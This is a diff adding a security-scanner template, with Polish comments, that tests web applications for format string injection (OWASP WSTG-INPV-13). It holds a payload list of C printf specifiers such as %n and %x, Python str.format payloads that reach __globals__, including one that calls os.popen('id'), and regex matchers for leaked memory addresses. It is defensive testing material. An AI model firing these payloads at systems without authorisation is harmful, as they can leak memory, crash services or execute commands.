@@ -1,0 +1,198 @@
+# ============================================================================
+# WSTG-INPV-13: Format String Injection (Universal)
+# Review status: ZACHOWANY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Powód decyzji: szablon spełnia wszystkie 6 kryteriów review (Coverage Matrix,
+# multi-warstwowe matchery z anti-FP, source comments, safety nets,
+# sweet spot payloadów, component fuzzing). OOB matcher nie jest dodany
+# świadomie: Format string = memory corruption marker; OOB nie ma zastosowania.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#   ✓ C-style format specifiers (%s, %d, %x, %p, %n)
+#   ✓ Long format strings (heap leak)
+#   ✓ Position-based specifiers (%1$s, %5$x)
+#   ✓ Python str.format() injection ({0.__class__})
+#   ✓ Java String.format / Formatter
+#
+# Performance budget: low (~50 payloads)
+# Estimated time: ~3-5 min
+#
+# Source hierarchy:
+#   1. seclists/Fuzzing/FormatString-Jhaddix.txt
+#   2. hacktricks/.../format-injection
+# ============================================================================
+
+id: wstg-inpv-13-format-string
+
+info:
+  name: "WSTG-INPV-13: Format String Injection (Universal)"
+  author: pentest-team
+  severity: low
+  description: |
+    Wykrywa format string injection w aplikacjach przekazujących user input
+    do printf/sprintf-like funkcji. C-style %x %s %n powodują heap leak lub
+    SIGSEGV. Python {0.__class__.__bases__} i Java %s mają inne implikacje.
+    Detekcja: hex addresses w odpowiedzi, runtime errors, info disclosure.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection
+    - https://book.hacktricks.xyz/pentesting-web/format-injection
+  classification:
+    cwe-id: CWE-134
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+  tags: dast,wstg,wstg-v42-inpv-13,format-string,asvs-v5.2.5,burp-history
+
+variables:
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: C-style format specifiers
+        # ====================================================================
+        - "%s"
+        - "%d"
+        - "%x"
+        - "%p"
+        - "%n"
+        - "%s%s%s%s%s"
+        - "%x%x%x%x%x"
+        - "%p%p%p%p%p"
+        - "%s%p%x%d"
+        - "%.1024d"
+        - "%999999999s"
+        # Position-based
+        - "%1$s"
+        - "%2$s"
+        - "%5$x"
+        - "%10$x"
+        - "%20$p"
+
+        # ====================================================================
+        # GROUP 2: Long format strings (heap dump)
+        # ====================================================================
+        - "%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"
+        - "AAAA%x.%x.%x.%x.%x.%x"
+        - "AAAA%08x.%08x.%08x.%08x.%08x.%08x"
+        - "%s.%s.%s.%s.%s.%s.%s.%s"
+
+        # ====================================================================
+        # GROUP 3: Python str.format() / f-string injection
+        # ====================================================================
+        - "{0}"
+        - "{0.__class__}"
+        - "{0.__class__.__bases__}"
+        - "{0.__class__.__bases__[0].__subclasses__()}"
+        - "{0.__init__.__globals__}"
+        - "{0.__init__.__globals__[os].popen('id').read()}"
+        - "{}"
+        - "{x}"
+        # f-string-like (Jinja2 confusion)
+        - "{{7*7}}"
+
+        # ====================================================================
+        # GROUP 4: Java String.format
+        # ====================================================================
+        - "%s%s%s%s"
+        - "%n"
+        - "%1$s"
+        - "%(s)"
+
+        # ====================================================================
+        # GROUP 5: Repeated specifier (crash / leak)
+        # ====================================================================
+        - "{{repeat(\"%x.\", 32)}}"
+        - "{{repeat(\"%s\", 32)}}"
+        - "{{repeat(\"%n\", 16)}}"
+        - "{{repeat(\"%p\", 32)}}"
+
+        # ====================================================================
+        # GROUP 6: URL-encoded variants
+        # ====================================================================
+        - "%25s"
+        - "%25x"
+        - "%25n"
+        - "%2525s"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - sygnał format string interpretation
+      - type: regex
+        part: body
+        name: format-string-evidence
+        regex:
+          # Hex memory addresses (heap leak via %x %p)
+          - "0x[0-9a-fA-F]{6,16}\\s+0x[0-9a-fA-F]{6,16}"
+          - "(?:0x[0-9a-fA-F]{8}[\\s.,]){3,}"
+          # Python class disclosure
+          - "<class '[a-zA-Z_][a-zA-Z0-9_.]+'>"
+          - "<type 'type'>"
+          - "<built-in function"
+          # printf errors
+          - "(?i)printf format"
+          - "(?i)Bad format string"
+          - "(?i)Format specifier missing"
+          # Java
+          - "(?i)java\\.util\\.MissingFormatArgumentException"
+          - "(?i)IllegalFormatConversionException"
+          - "(?i)UnknownFormatConversionException"
+          # Python format errors
+          - "(?i)IndexError: tuple index out of range"
+          - "(?i)KeyError: '\\d+'"
+          - "(?i)__class__"
+          # Generic
+          - "(?i)format string vulnerability"
+        condition: or
+
+      # Warstwa 2: SECONDARY
+      - type: dsl
+        dsl:
+          - "len(body) > 30"
+
+      # Warstwa 3: ANTI-FP - WAF, timeout
+      - type: dsl
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      - type: dsl
+        dsl:
+          - "duration < 30"
+
+    extractors:
+      - type: regex
+        name: leaked-addresses
+        part: body
+        group: 0
+        regex:
+          - "(?:0x[0-9a-fA-F]{8,16}[\\s.,]){2,}"
+
+# ============================================================================
+# Known limitations:
+# - Format string w aplikacjach webowych jest rzadkie (głównie native CGI/C++)
+# - Python {} format z user input zazwyczaj jest gated przez framework -
+#   wykrycie wymaga że framework przekazuje user input bezpośrednio do .format()
+# ============================================================================
